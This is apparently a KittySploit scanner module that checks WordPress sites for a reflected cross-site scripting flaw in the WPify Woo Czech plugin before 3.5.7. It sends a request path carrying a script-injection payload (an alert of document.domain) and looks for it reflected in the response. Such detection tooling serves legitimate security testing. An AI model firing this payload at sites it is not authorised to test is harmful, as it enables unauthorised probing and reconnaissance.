#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress WPify Woo Czech plugin before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress WPify Woo Czech <3.5.7 - Cross-Site Scripting Detection',
        'description': "WordPress WPify Woo Czech plugin before 3.5.7 contains a cross-site scripting vulnerability. The plugin uses the Vies library 2.2.0, which has a sample file outputting $_SERVER['PHP_SELF'] in an attribute without being escaped first. The issue is only exploitable when the web server has the PDO driver installed and write access to the example directory.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wp', 'wordpress', 'xss', 'wp-plugin', 'wpify', 'wpscan', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://wpscan.com/vulnerability/5c66c32b-22f2-4b59-a6b2-b8da944cdc3c'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/"><script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"><script>alert(document.domain)</script>', 'Add a new VAT ID to the queue',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="WordPress WPify Woo Czech <3.5.7 - Cross-Site Scripting detected",
                path='/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/"><script>alert(document.domain)</script>',
            )
            return True
        return False

